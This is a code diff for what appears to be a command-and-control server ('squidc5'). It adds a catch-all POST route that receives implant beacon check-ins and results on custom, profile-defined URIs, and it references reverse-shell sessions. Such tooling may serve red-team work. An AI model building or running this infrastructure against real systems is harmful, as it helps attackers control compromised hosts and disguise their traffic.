@@ -7,8 +7,8 @@ from collections.abc import AsyncIterator
 from contextlib import asynccontextmanager
 
 import uvicorn
-from fastapi import FastAPI
-from fastapi.responses import FileResponse, RedirectResponse
+from fastapi import FastAPI, HTTPException, Request
+from fastapi.responses import FileResponse, RedirectResponse, Response
 from fastapi.staticfiles import StaticFiles
 
 from squidc5 import __version__
@@ -81,6 +81,7 @@ async def build_state(settings: Settings) -> AppState:
     sessions.exec_probe = listeners.probe_exec
     sessions.drop_channel = listeners.drop_channel
     listeners.feature_check = features.enabled
+    listeners.profile_engine = profiles
     # After restart, reverse_shell rows can still say active with no socket
     orphaned = await sessions.close_orphaned_shells(probe=False)
     if orphaned:
@@ -265,6 +266,44 @@ def create_app(settings: Settings | None = None) -> FastAPI:
             "service": "sc5",
             "status": "ok",
         }
+
+    # Profile-aware HTTP beacon catch-all (custom URIs from active/known profiles)
+    from squidc5.profiles.http_beacon import process_beacon_checkin, process_beacon_result
+
+    @app.api_route("/{full_path:path}", methods=["POST"], include_in_schema=False)
+    async def profile_beacon_catch(request: Request, full_path: str) -> Response:
+        state = request.app.state.app_state
+        path = "/" + full_path if not full_path.startswith("/") else full_path
+        # never steal reserved API/ops/mcp surfaces
+        if (
+            path.startswith("/api/")
+            or path.startswith("/ops")
+            or path.startswith("/mcp")
+            or path in ("/", "/docs", "/redoc", "/openapi.json")
+        ):
+            raise HTTPException(404, "Not found")
+        pe = state.profiles
+        kind, prof = pe.match_beacon_path(path)
+        if kind not in ("beacon", "result"):
+            raise HTTPException(404, "Not found")
+        if not await state.features.enabled("implant_beacon"):
+            raise HTTPException(403, "Implant beacon is disabled by feature flag")
+        raw = await request.body()
+        payload = pe.unwrap_request_body(prof, raw)
+        client = request.client.host if request.client else None
+        ua = request.headers.get("user-agent")
+        try:
+            if kind == "beacon":
+                result = await process_beacon_checkin(
+                    state, remote_addr=client, payload=payload, user_agent=ua
+                )
+            else:
+                result = await process_beacon_result(state, payload)
+        except PermissionError as e:
+            raise HTTPException(403, str(e)) from e
+        except ValueError as e:
+            raise HTTPException(400, str(e)) from e
+        return Response(content=pe.wrap_response(prof, result), media_type="application/json")
 
     # Explicit 404 for common doc probes (even if something re-enables openapi later)
     @app.get("/docs")
